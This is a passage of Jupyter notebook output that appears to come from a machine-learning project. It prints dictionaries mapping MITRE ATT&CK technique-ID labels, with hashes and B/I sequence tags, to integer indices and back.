       " 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B': 57,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_B': 58,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B': 59,\n",
       " 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B': 60,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I': 61,\n",
       " 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I': 62,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_B': 63,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I': 64,\n",
       " 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I': 65,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_B': 66,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B': 67,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_I': 68,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I': 69,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I': 70,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B': 71,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I': 72,\n",
       " 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B': 73,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B': 74,\n",
       " 'T1547.001_777043894e42d2aae3881e63f6c76d33_I': 75,\n",
       " 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B': 76,\n",
       " 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B': 77,\n",
       " 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I': 78,\n",
       " 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B': 79,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I': 80,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_I': 81,\n",
       " 'T1105_1095434782a00c8a4772a11e625bcf5d_I': 82,\n",
       " 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B': 83,\n",
       " 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B': 84,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B': 85,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I': 86,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I': 87,\n",
       " 'T1518_8ddfaf982ab359cda13626b870ccb339_I': 88,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_B': 89,\n",
       " 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B': 90,\n",
       " 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I': 91,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I': 92,\n",
       " 'T1547.010_4593d72a5145e3f494421ac772d37464_B': 93,\n",
       " 'T1069.002_6103e503cb444bc7b4187704f2035708_B': 94,\n",
       " 'T1125_da86001b5081fcf773d8e62f22cf2b00_B': 95,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I': 96,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I': 97,\n",
       " 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B': 98,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I': 99,\n",
       " 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I': 100,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I': 101,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I': 102,\n",
       " 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I': 103,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I': 104,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B': 105,\n",
       " 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B': 106,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_I': 107,\n",
       " 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B': 108,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B': 109,\n",
       " 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B': 110,\n",
       " 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B': 111,\n",
       " 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I': 112,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B': 113,\n",
       " 'T1204.002_522f3f35cd013e63830fa555495a0081_B': 114,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_I': 115,\n",
       " 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B': 116,\n",
       " 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B': 117,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B': 118,\n",
       " 'T1564.004_76b6066fe170d38215251102e42be973_B': 119,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_B': 120,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_I': 121,\n",
       " 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I': 122,\n",
       " 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B': 123,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I': 124,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B': 125,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B': 126,\n",
       " 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B': 127,\n",
       " 'T1560_a1ee301b0508747b468d578a14e5c1a5_B': 128,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B': 129,\n",
       " 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B': 130,\n",
       " 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B': 131,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_B': 132,\n",
       " 'T1112_ba6f6214dbd17c54001e0a163b60f151_B': 133,\n",
       " 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B': 134,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B': 135,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_I': 136,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B': 137,\n",
       " 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B': 138,\n",
       " 'T1040_6881a4589710d53f0c146e91db513f01_I': 139,\n",
       " 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B': 140,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_B': 141,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_B': 142,\n",
       " 'T1546.013_f9a968af61d36983448c74cca5464e17_I': 143,\n",
       " 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_B': 144,\n",
       " 'T1087.001_feaced8f-f43f-452a-9500-a5219488abb8_B': 145,\n",
       " 'T1112_fd992e8ecfdac9b56dd6868904044827_I': 146,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_I': 147,\n",
       " 'T1497.001_1258b063-27d6-489b-a677-4807faacf868_B': 148,\n",
       " 'T1137_12ad9edefc86af07700fbf49bfdac6ba_I': 149,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_B': 150,\n",
       " 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_B': 151,\n",
       " 'T1112_257313a3c93e3bb7dfb60d6753b09e34_I': 152,\n",
       " 'T1105_e6715e61f5df646692c624b3499384c4_I': 153,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_B': 154,\n",
       " 'T1201_57296a2ddbeb7423c05feef2fe972111_B': 155,\n",
       " 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_B': 156,\n",
       " 'T1547_fe9eeee9a7b339089e5fa634b08522c1_I': 157,\n",
       " 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_I': 158,\n",
       " 'T1490_e90756bb6dcd21462dc4cc452661df91_B': 159,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_B': 160,\n",
       " 'T1007_d6bb2a19da7246731ed9c44831b135f8_B': 161,\n",
       " 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_B': 162,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_B': 163,\n",
       " 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_I': 164,\n",
       " 'T1497.001_5dc841fd-28ad-40e2-b10e-fb007fe09e81_B': 165,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_I': 166,\n",
       " 'T1007_c6607391-d02c-44b5-9b13-d3492ca58599_B': 167,\n",
       " 'T1217_69bbe2183fa09c00ccaac62d48e214f8_B': 168,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_I': 169,\n",
       " 'T1531_aa6b15485a5f50ced34d87fda177b758_B': 170,\n",
       " 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_B': 171,\n",
       " 'T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a_B': 172,\n",
       " 'T1083_6e1a53c0-7352-4899-be35-fa7f364d5722_B': 173,\n",
       " 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_B': 174,\n",
       " 'T1016_71b3d2945679566b9d94d8cb11df4b70_B': 175,\n",
       " 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_B': 176,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_B': 177,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_B': 178,\n",
       " 'T1562.001_43e3334362b140924f001b256b229ee5_I': 179,\n",
       " 'T1057_8adf02e8-6e71-4244-886c-98c402857404_B': 180,\n",
       " 'T1497.001_7a6ba833-de40-466a-8969-5c37b13603e0_B': 181,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_B': 182,\n",
       " 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_B': 183,\n",
       " 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_B': 184,\n",
       " 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_I': 185,\n",
       " 'T1490_c156ac5c9fa67080365268d95f29053d_B': 186,\n",
       " 'T1574.001_63bbedafba2f541552ac3579e9e3737b_B': 187,\n",
       " 'T1105_c521e0a70b243a0cf9217907ca3c6d27_I': 188,\n",
       " 'T1112_4bfb5f265a5ce07af6bf10da113af7db_I': 189,\n",
       " 'T1003_18f31c311ac208802e88ab8d5af8603e_I': 190,\n",
       " 'T1547.009_b6e5c895c6709fe289352ee23f062229_I': 191,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_B': 192,\n",
       " 'T1112_e7a987cbef27263e666e5b096488dc55_I': 193,\n",
       " 'T1112_35c0360d226cf38104f300d9d57ce60e_B': 194,\n",
       " 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_I': 195,\n",
       " 'T1490_8467c994685ccf178db166964bd80fab_B': 196,\n",
       " 'T1217_f7a0f7d704aa52a764d9d1bee81e65d6_B': 197,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_B': 198,\n",
       " 'T1003.001_0ef4cc7b-611c-4237-b20b-db36b6906554_I': 199,\n",
       " 'T1486_d82ceb9939d3d920ee550187ad8235c8_B': 200,\n",
       " 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_B': 201,\n",
       " 'T1003.002_5a484b65c247675e3b7ada4ba648d376_B': 202,\n",
       " 'T1491_47d08617-5ce1-424a-8cc5-c9c978ce6bf9_I': 203,\n",
       " 'T1033_c0da588f-79f0-4263-8998-7496b1a40596_B': 204,\n",
       " 'T1078.001_d0ca00832890baa1d42322cf70fcab1a_B': 205,\n",
       " 'T1547.001_163b023f43aba758d36f524d146cb8ea_I': 206,\n",
       " 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_I': 207,\n",
       " 'T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa_B': 208,\n",
       " 'T1482_cfb61005899996469ae3023796792ca5_B': 209,\n",
       " 'T1003.003_9f73269695e54311dd61dc68940fb3e1_B': 210,\n",
       " 'T1003.003_f049b89533298c2d6cd37a940248b219_B': 211,\n",
       " 'T1047_ed736a123da6fb2aab22cfd4f437e8b5_B': 212,\n",
       " 'T1105_eb814e03-811a-467a-bc6d-dcd453750fa2_I': 213,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_I': 214,\n",
       " 'T1105_c76968acda4aa1673dadcd67f3ab7664_B': 215,\n",
       " 'T1491_68235976-2404-42a8-9105-68230cfef562_I': 216,\n",
       " 'T1115_b007fe0c-c6b0-4fda-915c-255bbc070de2_B': 217,\n",
       " 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_B': 218,\n",
       " 'T1490_2d53d6fabd39bf9c70b0dfcdfbbc926d_B': 219,\n",
       " 'T1071.001_24c3b7b004401d839a5c337201da3484_B': 220,\n",
       " 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_I': 221,\n",
       " 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_I': 222,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_B': 223,\n",
       " 'T1057_b2a1e430ca6d36eb5af2fe666e769847_B': 224,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_I': 225,\n",
       " 'T1112_34041639e6e501856ecaf5969ee29c76_B': 226,\n",
       " 'T1087.001_6334877e8e3ba48f7835d4856d90a282_I': 227,\n",
       " 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_B': 228,\n",
       " 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_I': 229,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_I': 230,\n",
       " 'T1057_f8de05d1741dcc468f772ab0ff4dac72_B': 231,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_I': 232,\n",
       " 'T1120_7b9c7afaefa59aab759b49af0d699ac1_B': 233,\n",
       " 'T1003.001_35d92515122effdd73801c6ac3021da7_I': 234,\n",
       " 'T1219_7dabcbecab0334b115feefab1630f84a_B': 235,\n",
       " 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_I': 236,\n",
       " 'T1049_a14392d713dffba6a397682ff83259a0_B': 237,\n",
       " 'T1047_f4b0b4129560ea66f9751275e82f6bab_I': 238,\n",
       " 'T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8_B': 239,\n",
       " 'T1482_6131397e-7765-424e-a594-3d7fb2d93a6a_B': 240,\n",
       " 'T1047_b0255b5120cbabc062d8d4510a142c3b_B': 241,\n",
       " 'T1112_cd8be0e6b873919da25530a2c7ea6750_B': 242,\n",
       " 'T1112_cab7b85611a290c0769546bfa9d6f962_B': 243,\n",
       " 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_I': 244,\n",
       " 'T1112_7fe6a66d03f4dbfc022609ba311c2b11_I': 245,\n",
       " 'T1518.001_b8453a5fe06b24aea12b27592d5c3d3a_B': 246,\n",
       " 'T1016_921055f4-5970-4707-909e-62f594234d91_I': 247,\n",
       " 'T1018_ac20e592bc912bddff4d6b88289095f0_B': 248,\n",
       " 'T1562.004_5b93df032e230056c21a3e57334f77d1_I': 249,\n",
       " 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_B': 250,\n",
       " 'T1069.001_a1f48fa3ddee658b29b414523c9a295b_B': 251,\n",
       " 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_I': 252,\n",
       " 'T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e_B': 253,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_I': 254,\n",
       " 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_B': 255,\n",
       " 'T1007_9d03c91bdae5a80f17f89c987942b5a8_I': 256,\n",
       " 'T1564.001_66a5fd5f244819181f074dd082a28905_B': 257,\n",
       " 'O': 258,\n",
       " 'T1574.011_72249c1e9ffe7d8f30243d838e0791ca_I': 259,\n",
       " 'T1105_4f683658f161ccdc51337c470d32bab9_B': 260,\n",
       " 'T1047_ac122553ab4426ea3362bb4a97d31bfd_B': 261,\n",
       " 'T1123_372e6f46fca18e4f1b43209c20ffafa2_B': 262,\n",
       " 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_B': 263,\n",
       " 'T1059.003_6c318ef0339d74d909ad556681b6493e_I': 264,\n",
       " 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_B': 265,\n",
       " 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_I': 266,\n",
       " 'T1547.004_0856714c9810ac55b53e9964d02958a0_I': 267,\n",
       " 'T1016_7d8ee68f0e9731db82964f558f614608_B': 268,\n",
       " 'T1219_af8cb2bf9b436aae5c106a0a9c207e14_B': 269,\n",
       " 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_B': 270,\n",
       " 'T1112_e74d2fb4ef5fa6c766a4151554033697_B': 271,\n",
       " 'T1119_7121cdf93b951311be9d7078c602efdc_B': 272,\n",
       " 'T1115_70795de7cbb842edb029b3378c27c008_B': 273}"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "file_path = '../data/3_openKE_3/label2id.txt'  # 替換為您檔案的路徑\n",
    "label2index = build_dictionary(file_path)\n",
    "\n",
    "label2index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "70fe5975-9284-44ea-a0ab-b0cc63841c4d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{0: 'T1112_34041639e6e501856ecaf5969ee29c76_I',\n",
       " 1: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I',\n",
       " 2: 'T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B',\n",
       " 3: 'T1036.003_04e8d83e7badf098d50800d6aa1dd487_B',\n",
       " 4: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I',\n",
       " 5: 'T1059.001_ccdb8caf-c69e-424b-b930-551969450c57_B',\n",
       " 6: 'T1074.001_6469befa-748a-4b9c-a96d-f191fde47d89_I',\n",
       " 7: 'T1547.001_777043894e42d2aae3881e63f6c76d33_B',\n",
       " 8: 'T1047_f4b0b4129560ea66f9751275e82f6bab_B',\n",
       " 9: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_B',\n",
       " 10: 'T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69_B',\n",
       " 11: 'T1518.001_2dece965-37a0-4f70-a391-0f30e3331aba_B',\n",
       " 12: 'T1016_921055f4-5970-4707-909e-62f594234d91_B',\n",
       " 13: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_B',\n",
       " 14: 'T1518_c9be8043-a445-4cbf-b77b-ed7bb007fc7c_I',\n",
       " 15: 'T1564.004_76b6066fe170d38215251102e42be973_I',\n",
       " 16: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_B',\n",
       " 17: 'T1564.004_28862487a99f5f89bc0d68c87396c7e9_B',\n",
       " 18: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_I',\n",
       " 19: 'T1003.002_5a484b65c247675e3b7ada4ba648d376_I',\n",
       " 20: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_I',\n",
       " 21: 'T1562.004_8fe59e288f10a486dc8b44bc872019ff_B',\n",
       " 22: 'T1105_1095434782a00c8a4772a11e625bcf5d_B',\n",
       " 23: 'T1053.005_5db2884b6ca3ab932848f295a3896dc0_B',\n",
       " 24: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_B',\n",
       " 25: 'T1105_c521e0a70b243a0cf9217907ca3c6d27_B',\n",
       " 26: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_I',\n",
       " 27: 'T1124_fa6e8607-e0b1-425d-8924-9b894da5a002_B',\n",
       " 28: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_B',\n",
       " 29: 'T1053.005_ee454be9197890de62705ce6255933fd_B',\n",
       " 30: 'T1204.002_522f3f35cd013e63830fa555495a0081_I',\n",
       " 31: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_B',\n",
       " 32: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_I',\n",
       " 33: 'T1115_70795de7cbb842edb029b3378c27c008_I',\n",
       " 34: 'T1562.004_280003641a5cddf916c4f2bf605a71d3_B',\n",
       " 35: 'T1036.004_7de3d7b4922a7b996d8df36fb22bb118_B',\n",
       " 36: 'T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8_I',\n",
       " 37: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_B',\n",
       " 38: 'T1219_7dabcbecab0334b115feefab1630f84a_I',\n",
       " 39: 'T1562.004_8d0a4585e7c4646185a912b14cd9cb46_I',\n",
       " 40: 'T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc_B',\n",
       " 41: 'T1057_8adf02e8-6e71-4244-886c-98c402857404_I',\n",
       " 42: 'T1560_a1ee301b0508747b468d578a14e5c1a5_I',\n",
       " 43: 'T1074.001_e6dfc7e89359ac6fa6de84b0e1d5762e_I',\n",
       " 44: 'T1546.013_f9a968af61d36983448c74cca5464e17_B',\n",
       " 45: 'T1491_68235976-2404-42a8-9105-68230cfef562_B',\n",
       " 46: 'T1562.002_94f51bf01a7036fe02d07b4c18967669_I',\n",
       " 47: 'T1217_69bbe2183fa09c00ccaac62d48e214f8_I',\n",
       " 48: 'T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d_I',\n",
       " 49: 'T1040_6881a4589710d53f0c146e91db513f01_B',\n",
       " 50: 'T1531_b25ae80dad74142fafb510e9c1949ace_B',\n",
       " 51: 'T1047_6935e41353aa781bb723462d26114c44_B',\n",
       " 52: 'T1018_a44bb43474728496276d5d73aa14588f_B',\n",
       " 53: 'T1547.010_4593d72a5145e3f494421ac772d37464_I',\n",
       " 54: 'T1119_344e7eaf650763e0d3e9f02e62c1cf4b_I',\n",
       " 55: 'T1125_da86001b5081fcf773d8e62f22cf2b00_I',\n",
       " 56: 'T1021.001_dd67068b052fa553ad4a0ac7d6a5ea89_B',\n",
       " 57: 'T1055.001_a74bc239-a196-4f7e-8d5c-fe8c0266071c_B',\n",
       " 58: 'T1547.001_163b023f43aba758d36f524d146cb8ea_B',\n",
       " 59: 'T1059.001_6efbccc1869e8cd618c0d3ecda407d5f_B',\n",
       " 60: 'T1036.003_f5ef8466e5ebcd2ae03f338d9416069c_B',\n",
       " 61: 'T1074.001_4e97e699-93d7-4040-b5a3-2e906a58199e_I',\n",
       " 62: 'T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5_I',\n",
       " 63: 'T1518_8ddfaf982ab359cda13626b870ccb339_B',\n",
       " 64: 'T1219_f1b3fca18d7465cd10e5a7477a3bf97d_I',\n",
       " 65: 'T1547.004_aa147165f6c116cb0b0f944abe1db8ce_I',\n",
       " 66: 'T1105_e6715e61f5df646692c624b3499384c4_B',\n",
       " 67: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_B',\n",
       " 68: 'T1486_d82ceb9939d3d920ee550187ad8235c8_I',\n",
       " 69: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_I',\n",
       " 70: 'T1037.001_62cfa90fb03a6bc1a6ebcce8a3ea81b7_I',\n",
       " 71: 'T1112_257313a3c93e3bb7dfb60d6753b09e34_B',\n",
       " 72: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_I',\n",
       " 73: 'T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_B',\n",
       " 74: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_B',\n",
       " 75: 'T1547.001_777043894e42d2aae3881e63f6c76d33_I',\n",
       " 76: 'T1082_29451844-9b76-4e16-a9ee-d6feab4b24db_B',\n",
       " 77: 'T1490_9e5e4c0655fd1b5be88bd40b8251175f_B',\n",
       " 78: 'T1547.001_d3ef4145e4144fd694514b1c5cc17350_I',\n",
       " 79: 'T1105_0856c235a1d26113d4f2d92e39c9a9f8_B',\n",
       " 80: 'T1105_60f63260-39bb-4136-87a0-b6c2dca799fc_I',\n",
       " 81: 'T1119_7121cdf93b951311be9d7078c602efdc_I',\n",
       " 82: 'T1105_1095434782a00c8a4772a11e625bcf5d_I',\n",
       " 83: 'T1201_38f6f0e50a6b196140ec40d3dc9cc9e6_B',\n",
       " 84: 'T1564_dedfa0a54c9c13ce5714a0dc2e1f5d1a_B',\n",
       " 85: 'T1112_4bfb5f265a5ce07af6bf10da113af7db_B',\n",
       " 86: 'T1547.001_4b71ebb2f6f6a01235ba240fa40ce978_I',\n",
       " 87: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_I',\n",
       " 88: 'T1518_8ddfaf982ab359cda13626b870ccb339_I',\n",
       " 89: 'T1112_fd992e8ecfdac9b56dd6868904044827_B',\n",
       " 90: 'T1518.001_33a24ff44719e6ac0614b58f8c9a7c72_B',\n",
       " 91: 'T1547.001_0dbdf1a2a87e718a6ac8a8e3415a7fac_I',\n",
       " 92: 'T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4_I',\n",
       " 93: 'T1547.010_4593d72a5145e3f494421ac772d37464_B',\n",
       " 94: 'T1069.002_6103e503cb444bc7b4187704f2035708_B',\n",
       " 95: 'T1125_da86001b5081fcf773d8e62f22cf2b00_B',\n",
       " 96: 'T1120_7b9c7afaefa59aab759b49af0d699ac1_I',\n",
       " 97: 'T1069.001_5c4dd985-89e3-4590-9b57-71fed66ff4e2_I',\n",
       " 98: 'T1055.002_e5bcefee-262d-4568-a261-e8a20855ec81_B',\n",
       " 99: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_I',\n",
       " 100: 'T1564.001_dce51e632abdfe5392c7c1f942ac9273_I',\n",
       " 101: 'T1090.001_ba343199a4f15ed6b57eb52412f62e4e_I',\n",
       " 102: 'T1123_372e6f46fca18e4f1b43209c20ffafa2_I',\n",
       " 103: 'T1003.002_7fa4ea18694f2552547b65e23952cabb_I',\n",
       " 104: 'T1112_fa4ba6a06b4a5cd955ea5a60fae24281_I',\n",
       " 105: 'T1137_12ad9edefc86af07700fbf49bfdac6ba_B',\n",
       " 106: 'T1057_5a39d7ed-45c9-4a79-b581-e5fb99e24f65_B',\n",
       " 107: 'T1112_ba6f6214dbd17c54001e0a163b60f151_I',\n",
       " 108: 'T1562.004_41627f71f968225b9f162cb76d16bd9d_B',\n",
       " 109: 'T1547.009_501af516bd8b24fee0c7c650ae5cc861_B',\n",
       " 110: 'T1113_316251ed-6a28-4013-812b-ddf5b5b007f8_B',\n",
       " 111: 'T1016_14a21534-350f-4d83-9dd7-3c56b93a0c17_B',\n",
       " 112: 'T1059.003_f38e58deb7ad20b5538ca40db7b7b4f8_I',\n",
       " 113: 'T1059.001_bfff9006-d1fb-46ce-b173-92cb04e9a031_B',\n",
       " 114: 'T1204.002_522f3f35cd013e63830fa555495a0081_B',\n",
       " 115: 'T1105_c76968acda4aa1673dadcd67f3ab7664_I',\n",
       " 116: 'T1135_530e47c6-8592-42bf-91df-c59ffbd8541b_B',\n",
       " 117: 'T1018_26c8b8b5-7b5b-4de1-a128-7d37fb14f517_B',\n",
       " 118: 'T1547_fe9eeee9a7b339089e5fa634b08522c1_B',\n",
       " 119: 'T1564.004_76b6066fe170d38215251102e42be973_B',\n",
       " 120: 'T1059.003_6c318ef0339d74d909ad556681b6493e_B',\n",
       " 121: 'T1112_cab7b85611a290c0769546bfa9d6f962_I',\n",
       " 122: 'T1548.002_665432a4-42e7-4ee1-af19-a9a8c9455d0c_I',\n",
       " 123: 'T1046_5a4cb2be-2684-4801-9355-3a90c91e0004_B',\n",
       " 124: 'T1137.002_e2af3c3ab1b0f659c874b8af58c49759_I',\n",
       " 125: 'T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2_B',\n",
       " 126: 'T1496_46da2385-cf37-49cb-ba4b-a739c7a19de4_B',\n",
       " 127: 'T1566.001_1afaec09315ab71fdfb167175e8a019a_B',\n",
       " 128: 'T1560_a1ee301b0508747b468d578a14e5c1a5_B',\n",
       " 129: 'T1007_9d03c91bdae5a80f17f89c987942b5a8_B',\n",
       " 130: 'T1033_bd527b63-9f9e-46e0-9816-b8434d2b8989_B',\n",
       " 131: 'T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_B',\n",
       " 132: 'T1112_e7a987cbef27263e666e5b096488dc55_B',\n",
       " 133: 'T1112_ba6f6214dbd17c54001e0a163b60f151_B',\n",
       " 134: 'T1047_ac2764f7a67a9ce92b54e8e59b361838_B',\n",
       " 135: 'T1070.005_1f91076e2be2014cc7b4f1296de02fd6_B',\n",
       " 136: 'T1112_35c0360d226cf38104f300d9d57ce60e_I',\n",
       " 137: 'T1564.003_9a2edad4053a2b59fb9167a9bc29e7dc_B',\n",
       " 138: 'T1490_c8f329d2847ede593b6cb4a1ec6120fb_B',\n",
       " 139: 'T1040_6881a4589710d53f0c146e91db513f01_I',\n",
       " 140: 'T1047_09e0f9cf2eb803a1c35deeecf3665fad_B',\n",
       " 141: 'T1547.004_0856714c9810ac55b53e9964d02958a0_B',\n",
